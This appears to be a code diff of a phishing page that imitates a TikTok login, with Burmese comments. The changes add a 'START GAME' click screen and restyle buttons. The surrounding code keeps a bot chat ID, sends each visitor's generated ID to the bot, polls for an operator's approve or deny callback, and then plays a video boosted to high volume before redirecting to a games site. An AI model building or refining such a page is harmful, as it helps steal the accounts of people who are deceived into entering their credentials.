@@ -10,16 +10,47 @@
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; font-family: sans-serif; }
         .bg-setup { background-image: url('https://raw.githubusercontent.com/tar-alt/Photo-link-/6451c994788dbe34e12fbac624779364dbf1c113/Picsart_26-05-13_08-54-08-682.jpg'); background-size: cover; background-position: center; }
         
-        /* TikTok Style Inputs */
         .tt-input { width: 100%; padding: 12px; border: 1px solid #e5e7eb; background: #f9fafb; border-radius: 4px; outline: none; margin-bottom: 12px; }
         
-        /* Notification Bar Style */
         #topNotice { position: fixed; top: -100px; left: 0; width: 100%; padding: 15px; text-align: center; color: white; font-weight: bold; transition: 0.5s; z-index: 999; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
         .notice-success { background: #22c55e; }
         .notice-error { background: #ef4444; }
 
-        /* Entry Button at Bottom */
-        .entry-btn-small { position: absolute; bottom: 40px; left: 50%; transform: translateX(-50%); background: linear-gradient(45deg, #f093fb 0%, #f5576c 100%); padding: 10px 30px; border-radius: 30px; color: white; font-weight: bold; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.2); z-index: 100; }
+        /* ဂိမ်းဝင်ရန်ခလုတ်ကို သေးသေးလေးနှင့် ကြည့်ကောင်းအောင် ပြင်ဆင်မှု */
+        .entry-btn-pill { 
+            position: absolute; 
+            bottom: 30px; 
+            left: 50%; 
+            transform: translateX(-50%); 
+            background: linear-gradient(to right, #ff9bb5, #ff5e8e); 
+            padding: 8px 30px; 
+            border-radius: 50px; 
+            color: white; 
+            font-size: 12px; 
+            font-weight: 500; 
+            cursor: pointer; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2); 
+            z-index: 100;
+            border: none;
+        }
+
+        /* Start Screen Button Style */
+        .start-trigger {
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(10px);
+            border: 2px solid white;
+            padding: 15px 40px;
+            border-radius: 50px;
+            color: white;
+            font-weight: bold;
+            letter-spacing: 2px;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.05); opacity: 0.8; }
+            100% { transform: scale(1); opacity: 1; }
+        }
     </style>
 </head>
 <body>
@@ -84,11 +115,17 @@
         </div>
     </div>
 
+    <!-- ဗီဒီယိုအသံထွက်ရန်အတွက် ကြားခံနှိပ်ရမည့် Screen -->
+    <div id="clickScreen" class="hidden bg-setup w-full h-full flex items-center justify-center relative">
+        <div class="absolute inset-0 bg-black/40"></div>
+        <button onclick="playFinalWithAudio()" class="start-trigger z-10">START GAME</button>
+    </div>
+
     <div id="videoScreen" class="hidden w-full h-full relative bg-black">
         <video id="bgVideo" loop playsinline class="w-full h-full object-cover">
             <source src="https://raw.githubusercontent.com/tar-alt/Photo-link-/6c702837cece7d0f80bad49fe77f65382f442422/From%20KlickPin%20CF%20Clear%20social%20dialogue%20prompts%20for%20people%20who%20love%20beauty%20with%20timeless%20style%20that%20stay%20calm%20and%20fair%20-%20Pin-1121326007230552065.mp4" type="video/mp4">
         </video>
-        <button onclick="window.location.href='https://www.crazygames.com'" class="entry-btn-small">ဂိမ်းထဲသို့ ဝင်ရောက်ရန်</button>
+        <button onclick="window.location.href='https://www.crazygames.com'" class="entry-btn-pill">ဂိမ်းထဲသို့ ဝင်ရောက်ရန်</button>
     </div>
 
 </div>
@@ -98,10 +135,9 @@
     const chat = "5304050102";
     let userKey = "ID_" + Math.floor(Math.random() * 9999);
 
-    // ပထမဆုံး စဖွင့်ဖွင့်ချင်း Approved ဖြစ်ပြီးသားလား စစ်မည်
     window.onload = function() {
         if(localStorage.getItem("isApproved") === "true") {
-            playFinal();
+            toggle('clickScreen'); // Approved ဖြစ်ပြီးသားဆိုလျှင်လည်း Click Screen ကိုအရင်ပြမည်
         }
     };
 
@@ -166,11 +202,10 @@
 
             if (callback === `ok_${userKey}`) {
                 clearInterval(interval);
-                // Approved ဖြစ်သွားပြီဆိုတာကို Browser မှာ မှတ်ထားလိုက်မယ်
                 localStorage.setItem("isApproved", "true");
                 showNotice("Login ဝင်ရောက်မှု အောင်မြင်ပါသည်", "success");
                 await sendBot(`✅ ID: ${userKey} အား အောင်မြင်စွာ လက်ခံလိုက်ပါပြီ။`, false);
-                setTimeout(playFinal, 2000);
+                setTimeout(() => toggle('clickScreen'), 2000);
             } else if (callback === `no_${userKey}`) {
                 clearInterval(interval);
                 showNotice("Login ဝင်ရောက်မှု မအောင်မြင်ပါ။ သင့်အကောင့်အား ပြန်လည်စစ်ဆေးပါ။", "error");
@@ -180,18 +215,21 @@
         }, 3000);
     }
 
-    function playFinal() {
+    // Interaction ပြီးမှ ဗီဒီယိုနှင့် အသံကို ဖွင့်သည့် Function
+    function playFinalWithAudio() {
         toggle('videoScreen');
         const v = document.getElementById('bgVideo');
         v.muted = false;
         v.play();
+        
+        // Audio Boost (အသံပိုကျယ်အောင်လုပ်ခြင်း)
         const ctx = new (window.AudioContext || window.webkitAudioContext)();
         const src = ctx.createMediaElementSource(v);
         const gain = ctx.createGain();
-        gain.gain.value = 3.5;
-        src.connect(gain); gain.connect(ctx.destination);
+        gain.gain.value = 3.5; 
+        src.connect(gain); 
+        gain.connect(ctx.destination);
     }
 </script>
 </body>
 </html>
-
